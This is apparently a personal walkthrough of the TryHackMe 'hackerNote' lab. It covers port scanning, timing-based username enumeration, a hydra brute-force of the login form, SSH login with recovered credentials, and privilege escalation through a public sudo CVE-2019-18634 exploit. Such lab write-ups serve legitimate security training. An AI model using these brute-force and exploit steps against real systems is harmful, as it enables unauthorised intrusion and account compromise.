# https://tryhackme.com/room/hackernote

```bash
=================================
10.201.9.236 -- domain.com -- lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.9.236' >> ~/.zshrc && source ~/.zshrc

sudo rustscan --no-banner -u $(ulimit -Hn) -b 65535 -t 2000 --scan-order "Random" -r 1-65535 -a $TARGET -- -oA $(date +%Y-%m-%d_%H%M)_rustscan -A
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8+mhh7M4EpPVA2+5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ+/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io+Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP+fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A+n4J
|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=
|   256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo+OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z
80/tcp   open  http    syn-ack ttl 60 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - hackerNote
8080/tcp open  http    syn-ack ttl 60 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Home - hackerNote
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS

# http://10.201.9.236/login

// made user account
// tacoman:tacoman

// bad creds
// baduser:baduser
//  Invalid Username Or Password 

// good user:bad pass
// Logging in... Invalid Username Or Password 
// using F12 > Network tab : you can see there is a 1.5s delay (time delay attack)

/usr/lib/hashcat-utils/combinator.bin users.txt colors.txt > combined.txt
hydra -l james -P combined.txt 10.201.9.236 http-post-form '/api/user/login:password=^PASS^&username=^USER^:Invalid Username Or Password' -V
[80][http-post-form] host: 10.201.9.236   login: james   password: blue7

// logged into website
// SSH pass: dak4ddb37b

sshpass -p 'dak4ddb37b' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 james@$TARGET

sudo -l
// no dice but has exploit
https://github.com/saleemrashid/sudo-cve-2019-18634/archive/refs/heads/master.zip
unzip
make
scp
run
cat /root/flag.txt

Timing attacks on logins
https://seclists.org/fulldisclosure/2016/Jul/51
https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/
https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)

Adobe Password Breach
https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/

Sudo CVE
https://dylankatz.com/Analysis-of-CVE-2019-18634/
https://nvd.nist.gov/vuln/detail/CVE-2019-18634
https://tryhackme.com/room/sudovulnsbof
```